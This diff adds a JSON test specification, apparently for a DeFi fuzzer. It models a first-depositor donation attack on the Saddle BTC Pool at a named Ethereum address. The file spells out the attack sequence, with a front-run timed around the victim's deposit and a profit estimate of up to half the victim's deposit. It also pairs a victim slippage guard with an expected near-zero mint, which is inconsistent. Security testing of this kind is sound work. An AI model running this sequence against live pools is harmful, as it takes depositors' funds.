@@ -1,0 +1,77 @@
+{
+  "id": "CSPEC-SADDLE-BTC-001",
+  "template": "boundary_discontinuity",
+  "mode": "pool_near_empty",
+  "target": {
+    "address": "0x4f6a43ad7cba042606decaca730d4ce0a57ac62e",
+    "name": "Saddle BTC Pool",
+    "chain": "ethereum",
+    "historical_exploits": ["Jan 2021 - $275K first depositor", "Apr 2022 - $11M"]
+  },
+  "property": {
+    "name": "P-SADDLE-LP-FAIRNESS-01",
+    "predicate": "lp_tokens_received >= (deposit_amount * expected_rate * 0.99)",
+    "observation": ["lp_tokens_received", "deposit_amount", "virtual_price_before", "virtual_price_after"],
+    "tolerance": "1e-4"
+  },
+  "variables": {
+    "depth": {"min": 3, "max": 8},
+    "actions": {
+      "allowed": ["addLiquidity", "removeLiquidity", "removeLiquidityOneToken", "swap", "transfer"]
+    },
+    "amounts": [
+      {"name": "seed_deposit", "type": "uint256", "range": ["1", "1e8"], "description": "Initial wei deposit"},
+      {"name": "donation", "type": "uint256", "range": ["1e8", "1e18"], "description": "Direct token transfer to pool"},
+      {"name": "victim_deposit", "type": "uint256", "range": ["1e8", "1e18"], "description": "Victim's legitimate deposit"}
+    ],
+    "actors": [
+      {"name": "attacker", "role": "unprivileged", "capital_limit": "1e10"},
+      {"name": "victim", "role": "unprivileged", "capital_limit": "1e20"}
+    ],
+    "time_offsets_blocks": [{"name": "frontrun_window", "range": [0, 1]}],
+    "tokens": ["WBTC", "renBTC", "sBTC"]
+  },
+  "constraints": [
+    "pool_total_supply < 1e12",
+    "attacker_frontuns_victim",
+    "all_calls_must_succeed",
+    "no_privileged_roles",
+    "no_flash_loan_required"
+  ],
+  "objective": {
+    "type": "maximize_violation",
+    "metric": "attacker_extracted_value - attacker_initial_capital",
+    "success_threshold": "1e6"
+  },
+  "instrumentation": {
+    "trace": true,
+    "state_diff": true,
+    "gas_tracking": true,
+    "watch": {
+      "balances": ["WBTC", "renBTC", "sBTC", "saddleBTC_LP"],
+      "storage_slots": [
+        "swapStorage.lpToken.totalSupply",
+        "swapStorage.balances[0]",
+        "swapStorage.balances[1]",
+        "swapStorage.balances[2]"
+      ],
+      "events": ["AddLiquidity", "RemoveLiquidity", "RemoveLiquidityOne", "TokenSwap", "Transfer"]
+    }
+  },
+  "reproduction": {
+    "precondition": "Pool totalSupply < 1e12 (near empty)",
+    "sequence": [
+      {"actor": "attacker", "action": "addLiquidity", "params": {"amounts": [1, 0, 0], "minToMint": 0}},
+      {"actor": "attacker", "action": "WBTC.transfer", "params": {"to": "pool", "amount": "donation"}},
+      {"actor": "victim", "action": "addLiquidity", "params": {"amounts": ["victim_deposit", 0, 0], "minToMint": "expected_lp"}},
+      {"actor": "attacker", "action": "removeLiquidity", "params": {"amount": "all_lp", "minAmounts": [0, 0, 0]}}
+    ],
+    "expected_outcome": "victim receives 0 or near-0 LP tokens, attacker extracts ~50% of victim deposit"
+  },
+  "capital_analysis": {
+    "attacker_capital_required": "donation amount (recoverable)",
+    "net_cost": "gas fees only (~0.01-0.1 ETH)",
+    "expected_profit": "up to 50% of victim deposit",
+    "roi": ">100x on gas costs"
+  }
+}
